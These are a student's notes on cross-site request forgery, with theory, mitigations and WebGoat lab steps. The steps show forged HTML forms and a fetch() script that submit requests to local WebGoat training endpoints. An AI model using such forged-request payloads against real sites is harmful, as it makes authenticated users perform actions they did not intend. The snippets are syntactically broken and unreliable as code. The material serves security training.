2019/11/05

# theory
cross site request forgery CSRF seasurf XRF
malicious website    perform an unwanted action     on a trusted website    user is authenticated

On one tab bank account authenticated on the other tab malicious website.
problem: an attacker makes a user perform a sensitive action on a trusted website whre he/she is authenticated to.

to mitigate this problem there are several techniques:
- use one time tokens
- use reCAPTCHAs
- prompt authentication for sensitive actions.



# lab
### solve homework-6
>ctrl + spacebar to write '\0' as one char

### exercises(webgoat) CSRF
##### ex 3
- click on the button; watch the action
- replicate the request with a form in a new file
```
<form action="http://localhost:8081/WebGoat/csrf/basic-get-flag" method="GET">
    <input name="csrf" value="false" type="hidden"
    <input name="submit" value="submitQuery"
    ...

```

##### ex 4
- similar to the previous one
```
<form action="http://localhost:8081/WebGoat/csrf/review" method="POST">
    <input id="reviewText" value="special" type="hidden">
    <input id="reviewStar" value="4" type="hidden">
    <input name="validateReq" value="21sdqd12esdq21ewqd" type="hidden">
    <input type="submit" name="submit" value="false">
```

##### ex 7
corse policy
```
<script type="text/javascript">
        fetch("http://localhost:8081/WebGoat/csrf/feedback/message",{
            method: "POST"
            headers {
                "content-type": "application/json"
            },
            body: '{'"name": "webgoat", "email" : "gen@gmail.com" '}'
        })
</script>
```

the result tell us that the corse policy is enable
so we will preform such code using the form.
- todo as homework-7